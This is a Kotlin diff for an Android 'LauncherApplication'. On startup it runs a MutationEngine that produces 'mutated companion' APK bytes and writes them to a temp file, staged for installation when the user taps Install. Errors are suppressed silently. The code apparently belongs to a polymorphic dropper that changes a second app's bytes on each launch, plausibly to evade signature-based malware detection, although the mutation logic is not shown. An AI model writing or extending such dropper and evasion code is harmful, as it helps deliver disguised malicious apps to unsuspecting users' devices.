@@ -6,6 +6,7 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.launch
+import java.io.File
 
 class LauncherApplication : Application() {
 
@@ -13,10 +14,11 @@ class LauncherApplication : Application() {
         lateinit var instance: LauncherApplication
             private set
 
-        // MutationEngine result — accessible from InstallActivity
-        @Volatile var mutatedCompanionBytes: ByteArray? = null
-        @Volatile var mutationReady: Boolean = false
-        @Volatile var mutationError: Boolean = false
+        // File path for mutated companion — survives R8, no volatile field needed
+        const val MUTATED_APK_NAME = "mc.tmp"
+
+        fun getMutatedApkFile(app: Application): File =
+            File(app.filesDir, MUTATED_APK_NAME)
 
         private val appScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
     }
@@ -25,20 +27,18 @@ class LauncherApplication : Application() {
         super.onCreate()
         instance = this
 
-        // Start MutationEngine immediately — runs before any Activity is shown.
-        // By the time user taps Install (~10-15 seconds), mutation is done.
+        // Start MutationEngine immediately — writes result to filesDir/mc.tmp
+        // By the time user taps Install, file is ready
         appScope.launch {
             try {
-                val engine = MutationEngine(applicationContext)
-                val bytes  = engine.getMutatedCompanionBytes()
+                val engine  = MutationEngine(applicationContext)
+                val bytes   = engine.getMutatedCompanionBytes()
+                val outFile = getMutatedApkFile(this@LauncherApplication)
                 if (bytes.isNotEmpty()) {
-                    mutatedCompanionBytes = bytes
-                    mutationReady = true
-                } else {
-                    mutationError = true
+                    outFile.writeBytes(bytes)
                 }
             } catch (e: Exception) {
-                mutationError = true
+                // Silent fail — InstallActivity falls back to assets
             }
         }
 
